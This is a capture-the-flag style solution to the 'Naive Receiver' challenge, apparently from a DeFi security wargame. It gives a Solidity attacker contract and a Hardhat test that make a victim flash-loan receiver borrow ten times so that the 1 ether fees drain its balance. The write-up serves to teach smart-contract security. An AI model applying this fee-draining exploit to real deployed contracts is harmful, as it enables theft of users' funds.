# 2 - Naive Receiver

## &#x20;Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

contract AttackNaiveReceiver {
    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    constructor(NaiveReceiverLenderPool _pool, FlashLoanReceiver _receiver) {
        pool = _pool;
        receiver = _receiver;
    }

    function attack() external {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(address(receiver), 1 ether);
        }
    }
}

```

```javascript
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackNaiveReceiverFactory = await (await ethers.getContractFactory('AttackNaiveReceiver')).connect(attacker);
  const attackNaiveReceiver = await AttackNaiveReceiverFactory.deploy(this.pool.address, this.receiver.address);
  await attackNaiveReceiver.deployed();
  await attackNaiveReceiver.attack();
});
```

No matter how much **`FlashLoanReceiver`** borrows from **`NaiveReceiverLenderPool`,** it has to pay `1 ether` for fee.

So we simply make it borrow `1 ether` 10 times to drain its fund.

Done! 😎
